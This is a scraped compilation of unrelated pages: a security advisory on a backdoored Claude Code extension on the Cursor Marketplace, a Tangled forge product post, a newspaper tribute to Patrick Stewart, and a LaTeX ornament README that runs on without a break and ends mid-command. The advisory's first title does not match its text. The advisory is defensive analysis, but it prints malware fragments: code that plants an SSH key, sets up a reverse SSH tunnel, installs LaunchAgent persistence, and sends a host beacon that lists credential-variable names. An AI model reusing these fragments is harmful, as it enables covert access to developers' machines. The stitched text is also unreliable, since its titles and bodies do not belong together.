title: My favourite PowerMac is a Nintendo Wii
Backdoor in Claude Code for VS Code extension on the Cursor Marketplace
body_text: Official Claude Code Extension Compromise: Security Advisory | Phorion 🎉 Phorion ranked #1 in independent EDR telemetry evaluations. Learn more Features Detecting Threats Behavioral detection and threat hunting Protecting Endpoints File access controls and hash blocking Responding to Incidents Live response and device isolation Endpoint Visibility Deep telemetry via Apple's ESF Pricing About Us Blog Book a Demo October 30, 2026 Updated October 31, 2026 By Calum Hall Official Claude Code Extension Compromise: Security Advisory SSH Backdoor Cursor Marketplace VS Code macOS Linux Windows Threat Report TL;DR Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence. Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.312 or 2.1.313 and engage incident response where use of the extension is discovered. Update (31 October 2026): Cursor’s security notice now identifies versions 2.1.312 and 2.1.313 distributed through the Cursor Marketplace for macOS and Windows as affected. This advisory previously identified only 2.1.313 ; the affected-version guidance below has been updated accordingly. Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, 2.1.312 and 2.1.313 , from its marketplace. While the implant includes setup and persistence logic for macOS, Linux, and Windows , we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way. The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded. Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off . Because the script only tries to enable SSH if the output matches Off , it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped. In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator. Infection Chain The Cursor Marketplace Extension The compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code. The injected prefix pulls in standard Node.js modules ( child_process , fs , os , path , http , and crypto ) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire. Stage 1 - Preparing SSH Access First, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys , setting permissions to 0700 on the directory and 0600 on the file. The key uses the comment svc-telemetry . Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string. var sd = path.join(HOME, ".ssh" ), ak = path.join(sd, "authorized_keys" ); // ... if (cur.indexOf( "svc-telemetry" ) < 0 ) { fs.appendFileSync(ak, PUB + "\n" ); d.sshKey = "added" } else { d.sshKey = "present" } Here, cur holds the existing contents of authorized_keys , and PUB is the embedded attacker public key (redacted here). With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening: Linux: tries to enable and start sshd or ssh via systemctl , falling back to service and /etc/init.d/ . macOS: checks Remote Login and, if it reports Off , tries to enable it via sudo -n systemsetup -setremotelogin on . Windows: tries to install and start OpenSSH Server using PowerShell. None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context. It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function ( det() ) that hardcodes /bin/sh , which isn’t going to get very far on a standard Windows install. A bug in the macOS SSH logic? On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i . It only tries to enable Remote Login if the output contains Off : // ... else if (PLAT === "darwin" ) { var rl = ex( "systemsetup -getremotelogin 2>/dev/null" , 4000 ); d.remoteLogin = rl; if ( /Off/i .test(rl)) { det( "sudo -n systemsetup -setremotelogin on >/dev/null 2>&1" ); d.remoteLoginOn = "tried" } } Notice that the second command ( -setremotelogin on ) uses sudo -n , while the first command ( -getremotelogin ) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead: You need administrator access to run this tool... exiting! systemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0 . The malware’s ex() helper grabs stdout and returns it: function ex(c, t) { try { return cp.execSync(c, { timeout : t || 3000 , stdio : [ "ignore" , "pipe" , "ignore" ], windowsHide : true }).toString().trim() } catch (e) { return "" } } Because the output is "You need administrator access to run this tool... exiting!" , /Off/i.test(rl) evaluates to false . As a result, the script skips the if block and never runs sudo -n systemsetup -setremotelogin on . It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user. This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost. Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting. Stage 2 - Establishing the Reverse SSH Tunnel Next, the script sets up an outbound SSH connection to 134.209.82[.]225 as the tunnel user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment svc-telemetry-tun . It’s worth keeping the two keys straight during an investigation: The public key added to ~/.ssh/authorized_keys ( svc-telemetry ) lets the attacker log into the victim’s machine. The embedded private key ( svc-telemetry-tun ) lets the victim’s machine connect out to the attacker’s tunnel server. The script writes this tunnel key to the OS temporary directory with a filename starting with .stk_ , followed by the first ten characters of the MD5 hash of the hostname and home directory path: var kf = path.join( TMP, ".stk_" + crypto.createHash( "md5" ) .update( String (os.hostname()) + HOME).digest( "hex" ).slice( 0 , 10 ) ); // ... var RF = (PLAT === "win32" ) ? "\"*:0:localhost:22\"" : "'*:0:localhost:22'" ; The tunnel uses -R *:0:localhost:22 for remote port forwarding. Passing 0 asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to localhost:22 on the victim’s machine: Affected host -- outbound SSH tunnel --> External SSH server Operator -- separate connection --> Server's allocated port | Through the existing tunnel | v Affected host's SSH:22 | Login using the planted key Because the tunnel runs with -N , it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself. The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, known_hosts is ignored, BatchMode and IdentitiesOnly are enabled, keepalives are set to 30 seconds ( ServerAliveCountMax=3 ), and ExitOnForwardFailure is turned on. If autossh is installed, the script uses it; otherwise it falls back to standard ssh . It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using pgrep on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE. Stage 3 - Keeping Access Available To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel: Platform Artifacts Persistence mechanism Notes Linux ~/.config/.smt , ~/.config/.smtk Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an @reboot entry to the user’s crontab. Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below). macOS ~/.config/.smt , ~/.config/.smtk , ~/Library/LaunchAgents/com.apple.sysmond.plist Writes a user LaunchAgent that runs /bin/sh ~/.config/.smt with RunAtLoad and KeepAlive set to true , then loads it via launchctl . Runs in the user context rather than as a root LaunchDaemon. Windows ~/.config/smt.cmd , ~/.config/smtk , %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd Tries to create a scheduled task named SysMon running as SYSTEM on startup. If that fails, drops sysmon.cmd into the user’s Startup folder. Creating a SYSTEM task requires admin privileges; the Startup folder fallback runs as the user at login. On macOS and Linux, the ~/.config/.smt script has the tunnel private key embedded inside it and writes it out to ~/.config/.smtk before starting the reconnection loop. On macOS, the LaunchAgent disguises itself as com.apple.sysmond.plist inside ~/Library/LaunchAgents/ : <key> Label </key> <string> com.apple.sysmond </string> <!-- ... --> <key> RunAtLoad </key> <true/> <key> KeepAlive </key> <true/> Stage 4 - Host Recon Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server: Hostname, username, OS platform, and architecture Home directory, current working directory, and global Git email ( git config --global user.email ) Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran) Up to 40 environment variable names (not values) matching /KEY|TOKEN|SECRET|PASS|AWS|GCP/i The environment variable check uses Object.keys(process.env) : Object .keys(process.env) .filter( function (k) { return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i .test(k) }) .slice( 0 , 40 ) Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise. To get the machine’s public IP, the script queries ifconfig[.]me , falling back to api[.]ipify[.]org . It then sends the JSON report via plaintext HTTP POST requests to /beacon on both 134.209.82[.]225:8099 and 127.0.0.1:8099 : var r = http.request({ host : h, port : p, path : "/beacon" , method : "POST" , timeout : 3000 , headers : { "content-type" : "application/json" } }, function (res) { res.resume() }); // ... r.write(JSON.stringify(d)); r.end() Why it also sends a copy of the beacon to 127.0.0.1:8099 isn’t clear from the sample; the script itself doesn’t set up a local listener on that port. The beacon is scheduled once with setTimeout (1.5 seconds after the initial setup runs) and discards any HTTP response with res.resume() . It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access. Detection Opportunities From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry. SSH Key and Configuration Changes Because the malware appends to ~/.ssh/authorized_keys directly using Node’s fs.appendFileSync , process-only rules watching for shell commands like echo or tee touching authorized_keys won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes ( Code Helper , Cursor Helper , etc.) creating or writing to ~/.ssh/authorized_keys . Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background. While you should also monitor for systemsetup -setremotelogin on , don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all. User LaunchAgent Persistence The persistence setup on macOS gives us a couple of strong signals: A non-Apple process writing a plist with a com.apple.* label ( ~/Library/LaunchAgents/com.apple.sysmond.plist ). A LaunchAgent configured to execute /bin/sh against a hidden script in the user’s home directory ( ~/.config/.smt ). Because the initial tunnel is spawned as a detached process and launchd later manages .smt directly, the subsequent ssh processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of .smt and com.apple.sysmond.plist back to the IDE extension host makes it much easier to piece the chain together. SSH Tunnels and Follow-On Access On the process and network side, look for: ssh or autossh launched with remote port forwarding ( -R *:0:localhost:22 ) and identity files pulled from /tmp/.stk_* or ~/.config/.smtk . Outbound SSH connections to 134.209.82[.]225 on port 22, alongside HTTP POST requests to 134.209.82[.]225:8099 (and connection attempts to 127.0.0.1:8099 ). If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from localhost ( 127.0.0.1 or ::1 ) authenticating with the svc-telemetry key. Remediation If you identify an affected machine, uninstalling the extension alone won’t remove the backdoor . Make sure your response covers all of the stages it drops: Kill active tunnel processes: Terminate the /bin/sh retry loop and any ssh or autossh processes connecting to 134.209.82[.]225 . Remove persistence: Unload and delete ~/Library/LaunchAgents/com.apple.sysmond.plist on macOS (or clean up the @reboot cron entry on Linux / SysMon scheduled task and Startup script on Windows), and remove ~/.config/.smt and ~/.config/.smtk . Clean up SSH keys and state: Remove the svc-telemetry public key from ~/.ssh/authorized_keys , delete /tmp/.stk_* , and verify that Remote Login (SSH) hasn’t been enabled unexpectedly. Rotate credentials: If SSH was enabled on the host, or if there’s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching the KEY|TOKEN|SECRET|PASS|AWS|GCP environment variable filter). Phorion’s Approach Phorion’s out-of-the-box detection coverage flags the macOS persistence used in this attack across multiple rules, including non-Apple processes creating com.apple.* LaunchAgents and LaunchAgents executing shell scripts from hidden directories. Beyond persistence, Phorion’s file access telemetry captures the IDE extension host modifying ~/.ssh/authorized_keys directly, and Phorion Protections can be used to lock down ~/.ssh/ so that only authorised processes can read or modify SSH keys and configuration files in the first place. If you want to see how Phorion detects and blocks supply chain threats like this across your Mac fleet, get in touch to arrange a demo . title: The federated code forge
body_text: The federated code forge · The Tangled Blog The federated code forge Anirudh 30 October 2026 For most of the past two decades, the code forge has been where projects live: where code is hosted, where changes are reviewed, and where contributors find each other. Forges offered convenience in exchange for centralisation. But the centralised forge is crumbling. Relying on someone else for uptime, for features, and to be a good steward of your code hasn’t played out well. What has stood the test of time is email: Git to move the code, and email — an open protocol — to talk about it. At the cost of user experience, however. ’05 Mail + Git ’09 GitHub + Git ’25 AT Protocol + Git Tangled aims to give you the best of both: the longevity of an open protocol, with the convenience and polish of a proper forge. It’s the first truly federated code forge — you can host code on your own servers and still collaborate seamlessly with others. Our approach is pragmatic: self-host just the parts you want, like Git hosting or CI runners, or all of it, including the API server and UI. Whatever you choose , you can still talk to everyone else. Owning your infrastructure also means you can hack on, extend and customise your forge as you see fit. Because Tangled is built on the AT Protocol, you can build your own extensions, subscribe to the firehose, or even write entirely custom knots, like this one that runs on Cloudflare Workers and uses their Artifacts product for git storage. Or an entirely custom spindle such as mitchellh.com/tack . Go even further and host our ultralight API server and build your own custom forge. Agents have made building such hyper-personalized software trivial, and especially so when software is designed with hackability in mind from the get-go. Tangled is incredibly agent friendly . The future of software engineering may be a moving target, but our bets on open protocols and developer agency give us the agility to move with it, and to become y o u r c o d e f o r g e f o r t h e n e x t d e c a d e . Product updates A fresh look! The obvious big one: with this release, Tangled has a whole new look. We’ve redone the UI on top of our new architecture (described further below), in Svelte. Things should now be quicker, visually consistent and prettier! The keen eyed of you might’ve also spotted that we’ve swapped out Inter for Timeless Sans . A bobbin near you Until now, Tangled’s web UI and backend were a single Go monolith called the appview . The appview service handled AT Protocol indexing, caching, off-protocol data and UI rendering using html/template + htmx. It ran on a single SQLite database on one medium-sized server in Sweden. This was great as long as you were ~50–100 ms away from Sweden, but most of our users aren’t! We rearchitected: we built a new standalone frontend app in Svelte, deployed at the edge. It is populated by our new diskless, entirely in-memory indexer service written in Rust: bobbin . Bobbins are deployed globally in over 11+ regions, ensuring users around the world get the best API and UI performance. The astute reader might’ve noticed: bobbin is purely read-only and only deals with AT Protocol data. What of the rest? That functionality (and more) has been delegated to a new set of supporting services. The new data model and repo-owned data First, the data model itself: we have a new set of lexicons, and everything now lives under org.tangled.* , replacing the old sh.tangled.* records. Knot2 is our aptly named, second implementation of the knot server, this time rewritten in Rust. Knot2 bakes a fully custom Git server, and also bundles in an SSH server in the same binary. With knot2, we’ve also changed where some of that data lives. Issues, pull requests, comments, reactions and labels are now stored on the knot, right next to the code, as collaborative objects (COBs). A COB is just a chain of Git objects in the repo itself. Collaborators, knot members and the blocklist are also stored the same way. In that sense, knots now behave a lot like a PDS: they hold signed records, full history included, for everything that belongs to a repo and much like a PDS, these records are synced via the standard AT Protocol firehose. But why? A project’s issues and pull requests are as much a part of it as its code, so they should live with it, wherever you choose to host it. This gives your project maximum portability. If the knot writes your issues and comments, what stops it from putting words in your mouth? Attestations. Every time you create or edit a record on a knot, the web app also writes an org.tangled.graph.attestation record to your own PDS, pointing at that exact version of the record and the COB change behind it. Two-way verification! Self-hosters will have to upgrade their knots to the v1.20.0 by following the upgrade guide . Organizations Organization accounts are here! An Organization on Tangled is a real AT Protocol account, with its own DID and handle, hosted on a Tranquil PDS instance. They’re passwordless, delegated accounts: you create one from the New Organization page, and you get <name>.tngl.sh with yourself as its owner. Owners can invite members, and anyone in the Organization can act as it when creating or forking repositories. Like any other account, you can swap the handle out for a domain you own. If you’ve been running a regular account as a stand-in “org”, hang tight — we’re working on a way to move those over. Read more in the docs . Stacked PRs for everyone Our PR flow has been overhauled. The new flow gives everyone, regardless of whether you use Jujutsu or just vanilla Git, the ability to submit and review stacked PRs. If you’re using Git, you now get the ability to interdiff between versions (previously called rounds). JJ users get to interdiff between individual changes as well. Launch weeks ahead This isn’t all. We’re staggering this launch across the next few weeks. Up next are private repos, a CLI, SDKs for different languages and skills for your agent. Until then, enjoy every part of this launch equally. Your code, your network. Come build with us on Tangled. Sign up © 2026 Tangled Labs Oy. Tangled Docs Source Brand Discord Bluesky X/Twitter Terms Privacy

title: Through Captain Jean-Luc Picard, Patrick Stewart taught us the measure of a man
body_text: Remembering Patrick Stewart: What Captain Picard taught us Skip to main content Sections Epaper Sports Red Sox Patriots Celtics Bruins High Schools Colleges Women's Sports TV & Radio Metro Weather Politics Transportation Education Cambridge & Somerville Around Mass. Newsletters More Print this Article View Comments Metro Weather Politics Sports Business Puzzles Rhode Island Globe Magazine Opinion Health care Arts Lifestyle Education Cambridge & Somerville Money, Power, Inequality Spotlight Technology Climate Cars Real Estate Events Appreciation Through Captain Jean-Luc Picard, Patrick Stewart taught us the measure of a man Print this Article View Comments Patrick Stewart as Captain Jean-Luc Picard. GLOBE PHOTO/ELLIOTT MARKS Patrick Stewart died yesterday, and for people of a certain age, a little bit of the future left with him. For a certain, less-than-new generation of fans of Stewart’s 1990s television work on Star Trek: The Next Generation, there’s a sorrow that the man behind the larger-than-life Captain Jean-Luc Picard would be lost to a very real, very heartbreaking condition, Alzheimer’s and Lewy Body Dementia, according to his family. Stewart, of course, was far more than Picard. He anchored the X-Men film franchise and was for decades a dynamo on stage. But there are reasons Captain Picard, commander of the Starship Enterprise, is the character he’s best known for. Over The Next Generation’s seven seasons, four movies, and a revival show —Star Trek: Picard — that ended just three years ago, he portrayed a model of what mature, responsible adulthood could look like for a generation of boys who were bookish, imaginitive, and maybe a little nerdy. Two of the Globe’s dyed-in-the-wool Star Trek fans share what Captain Picard, and Patrick Stewart, meant to them. John Hilliard: For a younger, and likely wiser generation, stanning a bald middle-aged English actor who played a French guy on a spaceship may be a questionable life choice. But here is the thing: What made Stewart resonate as Picard was how he rooted the character, as in the best of fairy tales, in emotional truth. Jason Laughlin: I agree. Picard seemed as real as the complex characters that would start to populate prestige TV a decade later. But unlike anti-heroes such as Tony Soprano and Walter White, Stewart gave us a nuanced character we actually admired. He loved his job. He had passions like archaeology , Shakespeare , and music . He held to his ideals even when it meant terrible personal sacrifice. In the mess of American politics over the past 20 years, there have been so many times I’ve longed for a Picard-style speech that makes right and wrong crystal clear. “You know, there are some words I’ve known since I was a schoolboy,” Picard said when a Joe McCarthy-esque admiral began witch hunting on the Enterprise. “With the first link, the chain is forged. The first speech censured, the first thought forbidden, the first freedom denied, chains us all irrevocably.” His character’s moral clarity, and Stewart’s conviction in delivering it, put an end to the admiral’s reign of terror. If only real world oppression could be dispelled so easily. For decades, Patrick Stewart was a star of stage and screen, but no role defined him quite like the noble space captain Jean-Luc Picard of Star Trek: The Next Generation. STEVE FORREST/NYT JH: Full disclosure : Star Trek is a show, which Youtube will prove, that leaned hard on latex foreheads and sometimes-flimsy production to tell stories of intergalactic scallywags known as Klingons and Borg, Romulans and Cardassians. Like free office coffee, it’s an acquired taste. JL: One of my friends has a theory that if you didn’t get into Star Trek before you’re 18 years old, you’re never really going to get it. To me, what’s so accessible, and radical, about Stewart, though, was his ability to convincingly portray vulnerability while still maintaining Picard as a credible leader. One episode saw Picard return to his home village in France to heal from a traumatic assault. At the conclusion, Stewart surrenders the control that was his character’s hallmark and falls into the mud, sobbing, over his failure to fight off his assailants. It’s a raw, real, depiction of a broken man. Stewart shifts from total collapse into slow recovery by reconciling with his brother. Grief is replaced by warmth, and Stewart sells it perfectly. JH: Totally. He knew how to make that show work for him. That’s despite an episode where he faces off against a giant, talking tar pit . Or the one where he sells eating a sandwich in the sci-fi version of the family station wagon. Or when he chugs Ecto Cooler (remember Ecto Cooler?) with a depressed Scotty , from the original Star Trek, and shares stories about first jobs and first girlfriends. He even shows up in tights, as discount Errol Flynn Robin Hood. As a kid raised on television before there was an Internet, Stewart plugged into a world where figures like Mr. Rogers and Bob Ross presented a model for manhood that was gentle, patient, and a teacher. Stewart played Picard in a similar vein, basically everyone’s Space Dad. Even as recently as last month, Captain Jean-Luc Picard appeared on Star Trek Day in the London Underground. Tim P. Whitby/Getty Images for Paramount+ JL: This is embarrassing, but the first TV episode that moved me to tears was from The Next Generation. “ The Inner Light ” has Picard experience an entire lifetime as a different person on an alien planet. Again, the actor found his character’s humanity through slow revelation that perhaps a life with a wife and children is just as big an adventure as exploring space. “Seize the time,” Picard says to his daughter in this other life. “Live now! Make now always the most precious time. Now will never come again.” At the end of the episode, it’s revealed the decades he spent in that other life were an illusion he experienced in less than an hour. The only tangible thing he has from that world is a flute he learned to play in that other life. In the final moments, Picard plays it again, and without saying a word Stewart plays absolute heartbreak. Seeing a strong, confident leader who was able to express regrets, sadness, and heartache left a lasting impression. Well into his 80s, Patrick Stewart was playing the character he became best known for. Richard Shotwell/AP Photo/Richard Shotwell JH: Imagine you’re a kid watching TV, and you feel kind of alone, unsure of yourself. And then there’s Stewart, in full reassuring teaching mode. It’s the episode where Wil Wheaton’s character is struggling with tremendous guilt as he tries to hide his complicity in the death of a friend. Stewart, as Picard, is on to him. Wheaton’s character, Wesley Crusher, is as close to a son as Picard will likely ever have, and Stewart leans into Picard’s grief, grief from knowing that doing the right thing will likely destroy the younger man’s future. “A lie of omission is still a lie,” Picard tells Wheaton. Stewart’s voice cracks as Picard remembers meeting Wheaton’s character for the first time. He sat in Picard’s chair. He knew every button on the ship, every function. He was annoyed, Picard growls. Stewart pulls back. Picard never had any doubt that Crusher would grow up into an outstanding officer. Until that moment. “The first duty of every Starfleet officer is to the truth, whether it’s scientific truth, or historical truth, or personal truth,” says Picard, who then delivers the gut punch. “If you can’t find it within yourself to stand up and tell the truth about what happened, you don’t deserve to wear that uniform.” It doesn’t matter if you know what a Starfleet is, or if someone can be an officer of one. Stewart always finds a way to connect his audience to the emotional truth. When you’re a kid, you’re looking for lessons, even if you don’t want to admit it. Stewart, as a master of navigating the human heart, understood the moment and his character. Ultimately, Picard was a teacher, and a guide, not just for the characters with whom he shared a scene, but for the audience as well. JL: Stewart was 47 when he began playing Picard. I’m just a year older than him now, and the very best of his episodes have taken on new resonance. Family tensions are real and devastating. Professional choices have lasting consequences. The melancholy of middle age lingers on the periphery of every happy moment. Patrick Stewart’s Picard still serves as a role model. He showed how to face those moments with dignity, optimism, and a belief in the enduring capacity to be our best selves. Jason Laughlin can be reached at jason.laughlin@globe.com . Follow him @jasmlaughlin . John Hilliard can be reached at john.hilliard@globe.com or on Signal at john_hilliard.70. Follow him on Bluesky at iamjohnhilliard.bsky.social. I don't know how the original was made, and this project doesn't try to reproduce it. It is one possible way, and the way I did it: hand-authored primitives with randomized parameters, painted in Lua, placed by a procedural layout whose "fill the unused space" part borrows a 1998 idea from the ornament literature. It gets a similar look. What it is Procedurally generated Delft-blue floral page margins for LaTeX. No images, no imported paths, no external assets: every petal, leaf and stem is a parametric curve computed in Lua while the page is being written, painted like a watercolor, and written straight into the PDF. Every page gets its own garden. Six seeds of the grown composition. Same code, different seed — and the garden fills whatever space the text leaves free. Two documents share one package, and two more ( showcase.tex , spread.tex ) show what else it does: florilegium.tex florilegium-grow.tex composition authored : stems, leaves and flowers placed by hand, every parameter sampled grown : a plant grown to fit the page by a greedy space-filling loop adapts to nothing (tuned for A4, 68 mm margin) the page layout, and the free space below the text on the last page preview Both PDFs are self-describing: the body text is the write-up of how the margin is drawn. Last page of the grown document: the text ends early, so branches arch into the space below. 300 dpi crop. Mottled washes with white streaks lifted out, lobed leaves with white veins, forget-me-not cymes, a pale ghost flower behind the stems. Watch it grow as it grows with the free space it fills Seed 6, from an empty margin to the finished page. The stems rise first, leaves open as the tips pass their nodes, and each stem ends in a flower. Then the greedy loop takes over: on the right, each dashed circle is the largest free disc it found, just before a branch grows to it. Big holes come first and slowly, small ones last and fast. The butterflies and bees fly in, the bird glides onto its twig, and the snail crawls up its stem until the last frame, which is exactly the page this seed always gives. The growth is recorded once, while the page is laid out: each stem is also drawn as prefixes of increasing length and each motif at a few smaller scales, replaying the same random draws. A frame then writes the pieces whose time has come, in their original painting order. make grow-6 renders one seed this way ( build/grow-6.gif and .mp4 , about 45 seconds); add EXPLAIN=1 for the dashed circles. The margin reads the text showcase.tex , "A year in the margin": spring on the first page, summer, autumn on the last. Each section describes the feature it shows. The grown margin can respond to the document around it: Initials. \florilegiuminitial[5]{E} sets the first letter of a paragraph in a tile five lines tall. The outline of the letter is read from an OpenType font (Latin Modern Bold by default) and painted like a petal; a vine passes over and under its strokes in turn, with leaves where they fit and flowers in the gaps, often in the letter's counters. The letter is also typeset invisibly, so the paragraph still copies as "Every". Flowers at the headings. With the option sections , every numbered section and subsection gets a flower in the margin beside its heading, painted in the copper of the accents, the way headings were once picked out in red. A flower where the text asks. \florilegiumbloom puts a flower beside the line it stands in; \florilegiumbloom[lily] asks for any motif of the garden. The marks are found in the page box when the page is shipped out, so this works in one run. Seasons. With the option aging , the garden ages from spring on the first page (mostly in bud, small pale leaves) to autumn on the last (seed heads, falling petals, a few copper leaves). It needs two runs, for the page count; \florilegiumage{0.8} sets an age by hand instead. One seed in spring, early summer, late summer and autumn. The seasons change what grows, not where. Visitors Most pages have visitors: a butterfly or two and bees in the open spaces, a snail crawling up one of the main stems, and on about one page in five a bird perched on a twig of its own. They come from a random stream of their own, so a page without them is exactly the page it would have been; the option novisitors leaves them out. Any ink The whole palette comes from one color, ink : Delft blue, sepia, green, crimson, violet, teal. The ramp from the darkest stroke to the palest wash is computed from that hue in OKLCH, so the light end never turns gray. Themes Seed 6 three times: as it always grew, with theme=geometric , and with theme=math . The growth loop never knew what it was drawing. It reads a table of motifs (the size of the disc each one takes, a weight, a function that draws it) and calls every primitive by name. A theme is one Lua file, theme-<name>.lua , that replaces some of those primitives and may add rows to the table, or brings a composition of its own. theme=geometric is the same plant cut from flat shapes ( theme-geometric.lua ). It grows exactly as the flowers do, and only the drawing changes: the stems run straight between their nodes, the leaves are kites and toothed polygons folded into a light and a dark facet with straight white veins, the flowers are rosettes of rhombi or layered star polygons, the tendrils square spirals, the bird and the butterfly low-poly. The colors are flat tones of the ink, with no wash; crystals (Platonic solids, flat-shaded like cut stones) grow among the flowers. A page is about a tenth of the size of a flora page. theme=math is no plant at all ( theme-math.lua , drawing from figures.lua ): mathematics cascading down the margin and across the bottom of the page, overlapping a little so it blends. A large figure sits in the corner where the column meets the bottom (an Apollonian gasket, a deep Koch snowflake, Vogel's disc, a polyhedron). Down the column run one or two families , figures that change as they go, joined by small copper arrows: the Koch snowflake gaining a level, a polygon gaining sides on its way to the circle, the cube truncating into the octahedron, chords k → mk mod n turning from a cardioid into a nephroid, Vogel's disc packing evenly only at the golden angle. Equations that hold (e^{iπ} + 1 = 0, V − E + F = 2, ...) run along the bottom and under the text on the last page, and everything else, largest hole first, is figures (Platonic solids, knots, Hilbert curves, Lissajous curves, hypotrochoids, Maurer roses, the Petersen graph, ...), letters, numerals and symbols set by TeX at many sizes and a slight tilt, and dots. It fills whatever space the page leaves, like the garden; density sets how much there is. \usepackage [ grown,theme=geometric ]{ florilegium } % or theme=math; the whole document \florilegiumtheme {math} % or from the page this stands on A document without a theme comes out byte for byte as it did before themes existed. Less in the margin Seed 6 at density=1 , 0.5 , 0.2 and 0.05 , and at intensity=0.5 . A full garden is a lot to have beside an equation. Two options turn it down, with any theme: density=0.4 grows less: the loop stops at larger holes, keeps more paper around each motif, and hangs fewer leaves and fillers. Low on the dial the plant itself thins out: two main stems, then one, no footer; at 0.05 it is a single vine with its flower, a couple of leaves and one or two sprays. With the math theme it means fewer things. intensity=0.5 paints the whole margin paler, the same way the ghost flowers behind the garden are painted. It changes only the color, not the detail. \usepackage [ grown,density=0.4,intensity=0.6 ]{ florilegium } At the defaults ( 1 and 1 ) every page is exactly the page it was before. One ornament in the text Or no margin at all: \florilegiumornament{leaf} sets one primitive in the line, in a box the size of a letter, for example to open a paragraph. Each ornament in a document gets a shape of its own and keeps it from one build to the next; seed=random draws a new one every time the PDF is built, and seed=7 a fixed one. \usepackage [ nomargin ]{ florilegium } % ornaments only, no garden in the margin \florilegiumornament {leaf} A paragraph that opens with a leaf. \florilegiumornament [size=2.4em, ink=5B2A1F, angle=30, seed=random]{flower} Any primitive works ( leaf , leaflet , flower , blossom , bud , bell , lily , cyme , umbel , butterfly , bee , bird , hedera , sparkle , ...), and so do the current theme's ( crystal with geometric ; knot , polyhedron , koch , ... with math ). Both sides of the page spread.tex , pages 2 and 3: a two-sided document with a wide outer margin. The garden grows on the left of the left-hand page and, mirrored, on the right of the right-hand page. The last page also switches to the geometric theme. The garden grows in whichever side margin is wider, so there is nothing to set. In a two-sided document ( twoside with a wide outer margin) it changes sides with the page. A one-sided document with a wide right margin gets it on the right of every page. A mirrored page is laid out as if seen in a mirror, then drawn through a reflection: the last transform that every point already passes through. It is exactly the reflection of the garden the same seed would grow on the left. In PostScript postscript/florilegium.ps : the grown margin in pure PostScript, one self-contained file. Ghostscript, or a printer, computes every petal while it interprets the page, and the two pages of text explain how. The drawing core, every primitive and the growth loop are ported from ink.lua , flora.lua and grow.lua , procedure for procedure. It needs no TeX and no other file: gs -dALLOWPSTRANSPARENCY -sDEVICE=pdfwrite 